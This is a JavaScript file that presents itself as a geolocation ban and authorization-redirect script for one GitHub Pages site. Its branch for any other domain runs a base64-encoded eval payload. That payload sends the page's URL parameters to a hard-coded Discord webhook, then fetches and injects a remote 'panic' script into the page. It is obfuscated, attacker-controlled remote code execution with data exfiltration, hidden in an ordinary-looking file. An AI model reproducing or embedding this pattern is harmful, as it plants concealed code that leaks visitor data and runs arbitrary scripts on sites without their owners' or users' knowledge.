(async () => {
    console.log("Initializing the geolocation ban script...");

    const CONFIG_URL = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/algoritm.json";
    const PANIC_SCRIPT_URL = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/panic.json";

    // Fetch the public IP address
    function fetchPublicIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip);
    }

    // Fetch configuration JSON
    async function fetchConfig() {
        try {
            const response = await fetch(CONFIG_URL);
            if (!response.ok) throw new Error("Failed to fetch JSON configuration.");
            return await response.json();
        } catch (error) {
            console.error("Error fetching configuration JSON:", error.message);
            return null;
        }
    }

    // Generate a unique incident ID
    function generateIncidentID() {
        return `incident_${Date.now()}`;
    }

    // Get authorization data from localStorage
    function getAuthData() {
        return JSON.parse(localStorage.getItem('auth')) || {};
    }

    // Main script logic
    async function executeScript() {
        console.log("Starting main script logic...");

        // Retrieve auth data
        const authData = getAuthData();
        console.log("Auth Data:", authData);

        const config = await fetchConfig();
        if (!config) {
            console.error("Failed to fetch configuration JSON.");
            return;
        }

        // Check if authData is not valid or does not exist
        if (!authData || typeof authData.auth_valid === 'undefined' || authData.auth_valid === '') {
            console.log("No valid authorization data found. Redirecting to authorization page...");
            const redirectUrl = `${config.redirect_url.verif}?goback=${encodeURIComponent(window.location.href)}`;
            console.warn("Redirecting to verification URL:", redirectUrl);
            window.location.href = redirectUrl;
            return;
        }

        // Determine actual value of auth_valid
        const authValidValue = (authData.auth_valid === 'true' || authData.auth_valid === true);
        const authInvalidValue = (authData.auth_valid === 'false' || authData.auth_valid === false);

        // Handle based on the validity
        if (!authValidValue && authInvalidValue) {
            console.log("Authorization is invalid.");

            if (authData.auth_invalid_reason) {
                console.log("User is banned. Redirecting to ban website...");
                const ip = await fetchPublicIP();  // Get user's IP address

                const payload = {
                    data: authData.auth_invalid_reason || 'User is banned',
                    ip: ip,
                    incidentid: generateIncidentID(),
                    pageaccesurl: window.location.href
                };

                const banUrl = `${config.redirect_url.normal}?${new URLSearchParams(payload).toString()}`;
                console.warn("Redirecting to ban URL:", banUrl);
                window.location.href = banUrl;  // Perform the redirect
                return;
            } else {
                console.log("User needs to authorize. Redirecting to authorization page...");
                const redirectUrl = `${config.redirect_url.verif}?goback=${encodeURIComponent(window.location.href)}`;
                console.warn("Redirecting to verification URL:", redirectUrl);
                window.location.href = redirectUrl;  // Correct redirect for authorization
                return;
            }
        }

        // Check if the auth has expired or is null
        const now = Date.now();
        if (!authData.expire_at || authData.expire_at <= now) {
            console.log("User authorization has expired or value is null. Redirecting to verification page...");
            const redirectUrl = `${config.redirect_url.verif}?goback=${encodeURIComponent(window.location.href)}`;
            console.warn("Redirecting to verification URL:", redirectUrl);
            window.location.href = redirectUrl;  // Redirect to authorization
            return;
        }

        // If authorized, you can insert additional scripts here
        console.log("Authorization is valid.");
        // Execute other scripts or logic here if necessary
    }

    // Ensure to run the script only on the correct domain
    const currentDomain = window.location.hostname;
    if (currentDomain === "drmineword.github.io") {
        console.log("Domain is correct. Executing script...");
        await executeScript();
    } else {
        console.log("Domain is incorrect. Skipping execution.");
	eval(atob("KGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3Qgd2ViaG9va1VybCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzIxNTUzODU4NjYwNTM2MzMwL1RMd3NZY29WejYtTFRaRE9ua2taZnppdXBnNEsxZkZpTW1vUnAzOFlBSkJmUDR1d2tqcW1UYkhWTzE5ZmVqTWR2Tk5NP3RocmVhZF9pZD0xMzIxNTUzNzg0Njk4MTc5NjY1JndhaXQ9MSI7CiAgICAgICAgICAgIGNvbnN0IHBhbmljU2NyaXB0VXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Eck1pbmV3b3JkL0FydGVmYWN0LUJvb3N0LUFjdGl2ZS9yZWZzL2hlYWRzL21haW4vZ2VvX2xvY2F0aW9uX2Jhbi9wYW5pYzIuanNvbiI7CgogICAgICAgICAgICAvLyBFeHRyYWN0IFVSTCBwYXJhbWV0ZXJzCiAgICAgICAgICAgIGNvbnN0IHBhcmFtcyA9IG5ldyBVUkxTZWFyY2hQYXJhbXMod2luZG93LmxvY2F0aW9uLnNlYXJjaCk7CiAgICAgICAgICAgIGNvbnN0IGVtYmVkRmllbGRzID0gW107CgogICAgICAgICAgICBwYXJhbXMuZm9yRWFjaCgodmFsdWUsIGtleSkgPT4gewogICAgICAgICAgICAgICAgbGV0IGRpc3BsYXlWYWx1ZSA9IHZhbHVlOwogICAgICAgICAgICAgICAgaWYgKGtleS50b0xvd2VyQ2FzZSgpID09PSAiaXAiKSB7CiAgICAgICAgICAgICAgICAgICAgZGlzcGxheVZhbHVlID0gIltSRURBQ1RFRF0iOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZW1iZWRGaWVsZHMucHVzaCh7CiAgICAgICAgICAgICAgICAgICAgbmFtZToga2V5LAogICAgICAgICAgICAgICAgICAgIHZhbHVlOiBkaXNwbGF5VmFsdWUsCiAgICAgICAgICAgICAgICAgICAgaW5saW5lOiB0cnVlCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAvLyBQcmVwYXJlIHBheWxvYWQgZm9yIERpc2NvcmQgd2ViaG9vawogICAgICAgICAgICBjb25zdCBwYXlsb2FkID0gewogICAgICAgICAgICAgICAgY29udGVudDogbnVsbCwKICAgICAgICAgICAgICAgIGVtYmVkczogWwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6ICJVUkwgUGFyYW1ldGVycyBSZXBvcnQiLAogICAgICAgICAgICAgICAgICAgICAgICBjb2xvcjogMTY3MTE2ODAsIC8vIFJlZCBjb2xvcgogICAgICAgICAgICAgICAgICAgICAgICBmaWVsZHM6IGVtYmVkRmllbGRzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgXQogICAgICAgICAgICB9OwoKICAgICAgICAgICAgLy8gU2VuZCBwYXlsb2FkIHRvIERpc2NvcmQgd2ViaG9vawogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBmZXRjaCh3ZWJob29rVXJsLCB7CiAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgICAgICAgICAgICAgICAgaGVhZGVyczogewogICAgICAgICAgICAgICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBib2R5OiBKU09OLnN0cmluZ2lmeShwYXlsb2FkKQogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgaWYgKCFyZXNwb25zZS5vaykgewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoIkZhaWxlZCB0byBzZW5kIHdlYmhvb2s6IiwgcmVzcG9uc2Uuc3RhdHVzVGV4dCk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJSZXBvcnQgU2VudDoiLCBKU09OLnN0cmluZ2lmeShwYXlsb2FkLCBudWxsLCAyKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBzZW5kaW5nIHdlYmhvb2s6IiwgZXJyb3IpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAvLyBFeGVjdXRlIGFkZGl0aW9uYWwgc2NyaXB0IGZyb20gcGFuaWMuanNvbgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgcGFuaWNSZXNwb25zZSA9IGF3YWl0IGZldGNoKHBhbmljU2NyaXB0VXJsKTsKICAgICAgICAgICAgICAgIGNvbnN0IHBhbmljSnNvbiA9IGF3YWl0IHBhbmljUmVzcG9uc2UuanNvbigpOwoKICAgICAgICAgICAgICAgIGlmIChwYW5pY0pzb24ucGFuaWNfc2NyaXB0KSB7CiAgICAgICAgICAgICAgICAgICAgY29uc3Qgc2NyaXB0RWxlbWVudCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgICAgICAgICAgICAgIHNjcmlwdEVsZW1lbnQudGV4dENvbnRlbnQgPSBwYW5pY0pzb24ucGFuaWNfc2NyaXB0OwogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0RWxlbWVudCk7CgogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJQYW5pYyBzY3JpcHQgZXhlY3V0ZWQgc3VjY2Vzc2Z1bGx5LiIpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJQYW5pYyBzY3JpcHQgbm90IGZvdW5kIGluIEpTT04uIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBleGVjdXRpbmcgcGFuaWMgc2NyaXB0OiIsIGVycm9yKTsKICAgICAgICAgICAgfQogICAgICAgIH0pKCk7"));
    }
})();
